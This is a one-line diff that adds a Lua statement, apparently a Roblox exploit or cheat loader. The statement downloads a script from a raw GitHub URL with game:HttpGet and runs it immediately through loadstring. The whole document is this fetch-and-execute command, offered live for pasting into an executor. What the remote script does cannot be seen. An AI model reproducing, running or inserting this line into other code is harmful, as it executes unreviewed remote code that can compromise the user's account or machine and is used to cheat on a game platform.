@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/scripts/refs/heads/main/swloader"))()
